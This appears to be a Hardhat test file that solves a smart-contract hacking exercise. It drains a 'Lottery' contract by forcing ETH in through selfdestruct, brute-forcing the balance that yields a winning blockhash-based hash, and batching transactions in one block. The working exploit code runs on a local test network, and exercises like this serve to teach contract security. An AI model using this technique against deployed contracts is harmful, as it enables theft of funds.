const { time, mine } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers, network } = require("hardhat");

// The logic to win the lottery depends on the block number and the balance of the contract.
// We can aim for a fixed block number (ie the next block) and try to find the amount of eth
// that will trigger the winning logic. We can't send eth directly to the contract but we can
// abuse selfdestruct to fund the lottery (this is implemented in the FundContract contract).
// Steps:
// 1- Deploy FundContract which will enable us to send ETH to the Lottery contract
// 2- Replicate the lottery logic and simulate it with different values of ETH to find the winning
//    combination (balance needs to account for how much is already in the contract and the 0.01 we
//    are sending to play the game). The winning chance is 1/10000 so we can easily bruteforce this value.
// 3- Using the FundContract contract, send the amount found in the previous step to the Lottery contract.
// 4- Call play in the Lottery. For this to work both transactions need to be included in the same block.
describe("Lottery", function () {
  let lottery;

  beforeEach(async function() {
    const value = ethers.utils.parseEther("0.1234");
    const Lottery = await ethers.getContractFactory("Lottery");
    lottery = await Lottery.deploy({ value });
  });

  // replicate lottery logic and try with increments of 1 wei
  // to find a winning combination
  async function findCollision(balance, blockNumber) {
    const targetBlock = blockNumber - blockNumber % 200;
    const blockHash = (await ethers.provider.getBlock(targetBlock)).hash;

    let increment = 0;

    while(true) {
      const nextTry = balance.add(increment);

      const encoded = ethers.utils.defaultAbiCoder.encode(["bytes32", "uint256"], [blockHash, nextTry]);
      const hash = ethers.utils.keccak256(encoded);
      const n = ethers.BigNumber.from(hash).mod(10000);

      if (n.eq(0)) {
        return increment;
      }

      increment += 1;
    }
  }

  it("can be hacked", async function() {
    const FundContract = await ethers.getContractFactory("FundContract");
    const fundContract = await FundContract.deploy();
    await fundContract.deployed();

    // disable automine, we need to batch a couple of transaction
    // in the same block
    await network.provider.send("evm_setAutomine", [false]);

    const nextBlock = (await time.latestBlock()) + 1;
    const currentBalance = await ethers.provider.getBalance(lottery.address);
    const playValue = ethers.utils.parseEther("0.01");
    const balance = currentBalance.add(playValue);

    const increment = await findCollision(balance, nextBlock);

    await fundContract.fund(lottery.address, { value: increment });
    await lottery.play({ value: playValue });

    await mine();

    expect(await ethers.provider.getBalance(lottery.address)).to.eq(0);

    await network.provider.send("evm_setAutomine", [true]);
  });
});
